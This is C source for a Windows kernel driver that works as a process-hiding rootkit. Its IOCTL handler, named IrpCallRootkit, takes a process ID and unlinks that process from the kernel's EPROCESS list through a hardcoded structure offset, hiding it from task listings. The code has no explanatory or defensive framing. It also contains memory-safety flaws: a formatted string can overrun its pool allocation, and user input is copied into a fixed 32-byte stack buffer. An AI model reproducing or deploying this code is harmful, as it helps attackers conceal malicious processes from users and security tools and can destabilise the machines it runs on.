#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>
#include "dbgmsg.h"
#define IRP_CMD_CODE 0x815

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;

UNICODE_STRING usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\DISPLAYDEVICENAME");
UNICODE_STRING usSymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\DISPLAYDEVICENAME");

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
PCHAR modifyTaskList(UINT32 pid);
void remove_links(PLIST_ENTRY Current);
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage);
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(RegistryPath);
	PDEVICE_OBJECT deviceObject = NULL;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Driver loaded!\n"));
	DBG_PRINT1("[Driver Entry] Driver loaded!\n");

	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DriverObject->MajorFunction[i] = defaultIrpHandler;
	}
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpCallRootkit;

	status = IoCreateDevice(
		DriverObject,
		0,
		&usDeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&deviceObject);
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = IoCreateSymbolicLink(&usSymbolicLink, &usDeviceName);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(deviceObject);
		return status;
	}
	DriverObject->DriverUnload = DriverUnload;
	return (status);
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	IoDeleteSymbolicLink(&usSymbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Driver Unloaded\n"));
	return;
}

PCHAR modifyTaskList(UINT32 pid)
{
	LPSTR result = ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);
	ULONG PID_OFFSET = 0x440;
	ULONG LIST_OFFSET = PID_OFFSET;
	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);
	sprintf_s(result, 2 * sizeof(ULONG) + 30, "Found offsets: %lu & %lu", PID_OFFSET, LIST_OFFSET);
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	if (*(UINT32*)CurrentPID == pid)
	{
		remove_links(CurrentList);
		return (PCHAR)result;
	}
	PEPROCESS StartProcess = CurrentEPROCESS;
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{
		if (*(UINT32*)CurrentPID == pid)
		{
			remove_links(CurrentList);
			return (PCHAR)result;
		}
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}
	return (PCHAR)result;
}

void remove_links(PLIST_ENTRY Current)
{
	PLIST_ENTRY Previous, Next;
	Previous = (Current->Blink);
	Next = (Current->Flink);
	Previous->Flink = Next;
	Next->Blink = Previous;
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
	return;
}

NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}

NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpSp;
	ULONG inBufferLength, outBufferLength, requestcode;
	irpSp = IoGetCurrentIrpStackLocation(Irp);
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;
	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
	PCHAR buffer = NULL;
	PCHAR data = "This String is from Device Driver!!!";
	size_t datalen = strlen(data) + 1;
	switch (requestcode)
	{
	case IRP_CMD_CODE:
	{
		Irp->IoStatus.Information = inBufferLength;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "incoming IRP : %s", inBuf));
		char pid[32];
		strcpy_s(pid, inBufferLength, inBuf);
		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
		if (!buffer)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		data = modifyTaskList(atoi(pid));
		RtlCopyBytes(buffer, data, outBufferLength);
		Irp->IoStatus.Information = (outBufferLength < datalen ? outBufferLength : datalen);
		break;
	}
	default:
	{
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}
	}
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
